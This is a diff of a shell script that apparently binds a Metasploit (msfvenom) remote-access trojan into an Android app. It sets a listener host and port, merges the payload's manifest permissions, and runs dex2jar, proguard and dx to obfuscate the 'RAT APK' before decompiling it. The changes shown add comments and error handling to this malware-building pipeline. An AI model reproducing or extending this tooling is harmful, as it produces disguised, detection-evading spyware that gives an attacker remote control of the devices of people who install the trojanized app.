@@ -18,8 +18,8 @@
 MSFVENOM=msfvenom
 LHOST="10.6.9.31"
 LPORT="1337"
-APKTOOL=third-party/apktool/apktool
 DEX2JAR=d2j-dex2jar
+APKTOOL=third-party/apktool/apktool
 PROGUARD=third-party/proguard5.2.1/lib/proguard
 DX=third-party/android-sdk-linux/build-tools/23.0.3/dx
 MY_PATH=`pwd`
@@ -83,18 +83,39 @@ diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
 mv $merged_manifest_file $original_manifest_file
 echo "done."
 
+# cleanup payload directory after merging app permissions
 rm -rf $MY_PATH/payload >> $LOG_FILE 2>&1
 
+# use dex2jar, proguard, and dx
+# to shrink, optimize, and obfuscate original Rat.apk code
 echo -n "[*] Running proguard on RAT APK file...";
 mkdir -v -p $MY_PATH/bin/classes >>$LOG_FILE 2>&1
 mkdir -v -p $MY_PATH/libs >> $LOG_FILE 2>&1
 mv $MY_PATH/$RAT_APK_FILE $MY_PATH/bin/classes >>$LOG_FILE 2>&1
 $DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -v -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
+rc=$?
+if [ $rc != 0 ]; then
+  echo "done.";
+  echo "[!] Failed to run dex2jar on RAT APK file";
+  exit $rc;
+fi
 cd $MY_PATH/bin/classes && jar xvf Rat-dex2jar.jar >>$LOG_FILE 2>&1
 cd $MY_PATH
 rm $MY_PATH/bin/classes/*.apk $MY_PATH/bin/classes/*.jar >>$LOG_FILE 2>&1
 $PROGUARD @android.pro >>$LOG_FILE 2>&1
+rc=$?
+if [ $rc != 0 ]; then
+  echo "done.";
+  echo "[!] Failed to run proguard with specified configuration";
+  exit $rc;
+fi
 $DX --dex --output="$MY_PATH/$RAT_APK_FILE" $MY_PATH/bin/classes-processed.jar >>$LOG_FILE 2>&1
+rc=$?
+if [ $rc != 0 ]; then
+  echo "done.";
+  echo "[!] Failed to run dx on proguard processed jar file";
+  exit $rc;
+fi
 echo "done."
 
 echo -n "[*] Decompiling obfuscated RAT APK file...";
